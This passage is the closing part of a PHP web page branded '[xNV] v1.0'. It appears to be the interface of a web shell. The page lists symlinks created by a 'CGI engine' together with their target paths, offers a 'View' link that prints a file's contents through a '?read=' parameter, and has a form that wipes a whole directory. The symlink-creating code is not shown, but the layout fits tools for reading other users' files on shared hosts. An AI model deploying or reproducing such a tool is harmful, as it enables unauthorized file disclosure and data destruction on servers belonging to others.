<?php endif; ?>
</div>
</form>
<?php if (!empty($deployed_dir)): ?>
<div class="ds" style="margin-top:20px">
<h4>Deployed</h4>
<div class="sl">
<a href="<?php echo htmlspecialchars($deployed_dir . '/' . $deployed_cgi); ?>" target="_blank" class="btn bp"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg> Run <?php echo htmlspecialchars($deployed_cgi); ?></a>
<a href="<?php echo htmlspecialchars($deployed_dir); ?>/" target="_blank" class="btn bsc"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="9" y1="21" x2="9" y2="9"></line></svg> Directory Index</a>
</div>
</div>
<?php endif; ?>
</div>
</div>

<?php if ($active_dir && is_dir($active_dir)): ?>
<div class="cd">
<div class="ch">
<div class="ct"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg> <?php echo htmlspecialchars($active_dir); ?> (<?php echo count($symlink_list); ?> items)</div>
<form method="post" onsubmit="return confirm('Wipe entire directory?');">
<input type="hidden" name="action" value="clean">
<input type="hidden" name="clean_dir" value="<?php echo htmlspecialchars($active_dir); ?>">
<button type="submit" class="btn bdn" style="padding:4px 10px;font-size:11px"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg> Wipe</button>
</form>
</div>
<div class="cb">
<?php if (empty($symlink_list)): ?>
<p style="color:var(--tm);font-family:var(--fm);font-size:12px">Empty. Run the CGI engine first.</p>
<?php else: ?>
<div class="tw">
<table>
<thead><tr><th>Link</th><th>Target</th><th>Size</th><th></th></tr></thead>
<tbody>
<?php foreach (array_slice($symlink_list, 0, 100) as $lk): ?>
<tr>
<td><a href="<?php echo htmlspecialchars($lk['path']); ?>" target="_blank" class="lk"><?php echo htmlspecialchars($lk['name']); ?></a></td>
<td style="color:var(--tm);font-size:11px"><?php echo htmlspecialchars($lk['target']); ?></td>
<td><?php echo $lk['size'] > 0 ? number_format($lk['size']) . ' B' : '-'; ?></td>
<td><a href="?read=<?php echo urlencode($lk['path']); ?>" class="btn bsc" style="padding:2px 8px;font-size:11px">View</a></td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</div>
<?php if (count($symlink_list) > 100): ?>
<p style="margin-top:10px;font-size:11px;color:var(--tm);font-family:var(--fm)">Showing 100 of <?php echo count($symlink_list); ?>.</p>
<?php endif; ?>
<?php endif; ?>
<?php if ($view_content !== ''): ?>
<div class="vb">
<div class="vh">
<span><?php echo htmlspecialchars($view_filename); ?></span>
<a href="<?php echo basename($_SERVER['PHP_SELF']); ?>" style="color:var(--tm);text-decoration:none">&times;</a>
</div>
<div class="vc"><?php echo htmlspecialchars($view_content); ?></div>
</div>
<?php endif; ?>
</div>
</div>
<?php endif; ?>

<footer class="ft">[xNV] v1.0</footer>
</div>
</body>
</html>
